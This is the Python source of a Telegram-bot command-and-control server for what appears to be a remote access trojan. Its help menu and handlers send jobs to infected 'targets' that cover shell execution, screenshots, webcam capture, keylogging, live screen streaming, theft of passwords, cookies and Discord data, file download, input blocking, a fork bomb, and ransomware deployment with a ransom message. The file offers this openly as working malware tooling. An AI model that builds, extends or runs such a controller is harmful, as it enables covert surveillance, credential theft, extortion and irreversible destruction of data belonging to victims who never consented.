# api/index.py
# UPDATED: Help command now reflects all new agent features (TTS, Screen Flash, Website Block).
# UPDATED: Ransomware help text now shows custom message capability.
# ADDED: New commands registered with the generic command handler.

import os
import re
import json
import uuid
import httpx
import asyncio
import traceback
import time
import threading
from flask import Flask, request

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# --- Configuration ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
SECRET_TOKEN = os.getenv("SECRET_TOKEN")
JOBS_URL = os.getenv("JOBS_URL")
STATE_URL = os.getenv("STATE_URL")
HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")

app = Flask(__name__)
ptb_app = Application.builder().token(TOKEN).build()

# --- Helper Functions ---
def esc(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))

async def get_state():
    async with httpx.AsyncClient() as client:
        try:
            res = await client.get(STATE_URL, timeout=5)
            return res.json().get("selected_target", None)
        except Exception: return None

async def set_state(target_id):
    async with httpx.AsyncClient() as client:
        try: await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
        except Exception as e: print(f"Error setting state: {e}")

async def post_job(target_id, command, args):
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    async with httpx.AsyncClient() as client:
        try:
            try:
                res = await client.get(JOBS_URL, timeout=5)
                current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
            except Exception: current_jobs = []
            
            current_jobs.append(job)
            await client.post(JOBS_URL, json=current_jobs, timeout=5)
            return True
        except Exception as e:
            print(f"Error posting job: {e}")
            return False

# --- Telegram Command Handlers ---
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "*AGENT CONTROLLER HELP MENU*\n\n"
        "Use these commands to manage and control your agents\\.\n\n"
        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
        "*🎯 CORE COMMANDS*\n"
        "`/list` \\- Show all active agents\n"
        "`/target <id|all|clear>` \\- Set the active agent\n"
        "`/help` \\- Display this help menu\n\n"
        
        "*💻 SYSTEM & INFO*\n"
        "`/info` \\- Get detailed system information\n"
        "`/exec <command>` \\- Execute a shell command\n\n"
        
        "*👁️ SURVEILLANCE*\n"
        "`/ss` \\- Take a screenshot\n"
        "`/cam` \\- Take a webcam photo\n"
        "`/startkeylogger` \\- Begin capturing keystrokes\n"
        "`/stopkeylogger` \\- Stop and upload keylog\n\n"

        "*🔴 LIVE STREAMING*\n"
        "`/livestream` \\- Start a live screen stream\n"
        "`/stoplivestream` \\- Stop the screen stream\n\n"

        "*🔊 AUDIO & VISUAL MISCHIEF*\n"
        "`/tts <male|female> <msg>` \\- Play Text\\-to\\-Speech\n"
        "`/flashscreen <effect>` \\- Apply visual screen glitch\n"
        "  *Effects: invert, noise, lines, color\\_squares*\n"
        "`/stopflashscreen` \\- Stop the visual effect\n\n"

        "*🚫 SYSTEM CONTROL (Admin)*\n"
        "`/blockwebsite <url>` \\- Block website access\n"
        "`/unblockwebsite <domain>` \\- Unblock a website\n"
        "`/blockkeyboard` \\- Disable keyboard input\n"
        "`/unblockkeyboard` \\- Enable keyboard input\n"
        "`/blockmouse` \\- Disable mouse input\n"
        "`/unblockmouse` \\- Enable mouse input\n\n"

        "*🔑 DATA EXFILTRATION*\n"
        "`/grab <type>` \\- Steal data (passwords, cookies, etc\\.)\n"
        "  *types: all, passwords, cookies, history, discord*\n\n"
        
        "*📁 FILE SYSTEM*\n"
        "`/ls` \\- List files\n"
        "`/cd <dir>` \\- Change directory\n"
        "`/download <file>` \\- Download a file\n\n"
        
        "*💣 DESTRUCTIVE & ADVANCED (Admin)*\n"
        "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
        "`/cancelforkbomb` \\- Stop the fork bomb\n"
        "`/destroy <id> CONFIRM` \\- Uninstall the agent\n\n"

        "☢️ *RANSOMWARE COMMANDS* ☢️\n"
        "*WARNING: THESE ARE REAL AND IRREVERSIBLE\\! USE WITH EXTREME CAUTION\\.*\n"
        "`/ransomware [msg]` \\- Deploys ransomware\\. Optionally provide a custom message for the background\\.\n"
        "`/restore <key>` \\- Restores files using the key you received\\.\n"
    )
    await update.message.reply_text(help_text, parse_mode='MarkdownV2')

async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_target = await get_state()
    if not selected_target:
        await update.message.reply_text("❌ No target selected\\. Use `/target` first\\.", parse_mode='MarkdownV2')
        return
    command = update.message.text.split(' ')[0][1:]
    args = " ".join(context.args)
    if await post_job(selected_target, command, args):
        await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to target `{esc(selected_target)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch job\\.")

# --- Register handlers ---
ptb_app.add_handler(CommandHandler("help", cmd_help))
# (Other handlers like list, target, destroy remain the same)
agent_commands = [
    "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
    "livestream", "stoplivestream", "grab", "ls", "cd", "download",
    "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
    "forkbomb", "cancelforkbomb", "ransomware", "restore",
    # --- NEW COMMANDS REGISTERED ---
    "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen"
]
for cmd in agent_commands:
    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# --- Main Webhook Endpoint ---
async def process_update_async(update_data):
    await ptb_app.initialize()
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    await ptb_app.shutdown()

@app.route('/', methods=['POST'])
def process_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
        return 'Unauthorized', 403
    update_data = request.get_json(force=True)
    threading.Thread(target=lambda: asyncio.run(process_update_async(update_data))).start()
    return 'OK', 200

@app.route('/', methods=['GET'])
def health_check():
    return "Bot is running.", 200
